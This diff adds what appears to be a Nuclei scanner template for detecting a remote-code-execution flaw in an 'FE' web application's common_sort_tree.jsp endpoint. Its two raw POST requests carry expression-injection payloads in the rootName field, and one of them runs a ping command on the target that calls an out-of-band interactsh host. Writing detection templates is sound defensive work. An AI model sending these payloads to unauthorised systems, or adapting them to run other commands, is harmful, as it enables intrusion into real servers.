@@ -1,0 +1,37 @@
+id: fe-common-sort-tree-rce
+
+info:
+  name: fe-common-sort-tree-rce
+  author: fe-common-sort-tree-rce
+
+
+requests:
+  - raw:
+      - |
+        POST /common/common_sort_tree.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/531.2 (KHTML, like Gecko) Chrome/49.0.818.0 Safari/531.2
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        
+        rootName={%25Thread.@java.net.InetAddress@getByName('{{interactsh-url}}')%25}
+
+      - |
+        POST /common/common_sort_tree.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/531.2 (KHTML, like Gecko) Chrome/49.0.818.0 Safari/531.2
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        
+        rootName={%25Thread.@java.lang.Runtime@getRuntime().exec('ping+-nc+2+{{interactsh-url}}')%25}
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+
